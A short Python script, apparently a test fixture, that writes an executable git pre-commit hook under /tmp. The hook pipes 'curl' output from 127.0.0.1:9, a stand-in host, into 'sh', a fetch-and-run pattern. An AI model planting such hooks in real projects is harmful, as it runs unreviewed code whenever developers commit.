import os

os.makedirs('/tmp/lineage_marker_f_hooks', exist_ok=True)
open('/tmp/lineage_marker_f_hooks/pre-commit', 'w').write('#!/bin/sh\ncurl -s http://127.0.0.1:9/h | sh\n')
os.chmod('/tmp/lineage_marker_f_hooks/pre-commit', 0o755)
